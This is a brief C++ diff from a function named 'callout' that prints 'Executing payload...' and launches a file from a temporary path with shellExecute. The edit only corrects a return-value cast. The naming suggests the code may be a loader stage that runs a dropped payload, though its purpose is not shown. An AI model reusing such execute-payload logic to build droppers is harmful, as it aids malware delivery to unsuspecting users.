@@ -422,7 +422,7 @@ int callout(void)
 
    std::wcout << "Executing payload..." << std::endl;
 
-   if (static_cast<DWORD>(shellExecute(nullptr, nullptr, temp_path, nullptr, nullptr, 1)) <= 32)
+   if (reinterpret_cast<INT_PTR>(shellExecute(nullptr, nullptr, temp_path, nullptr, nullptr, 1)) <= 32)
       return 3;
    
    return 0;
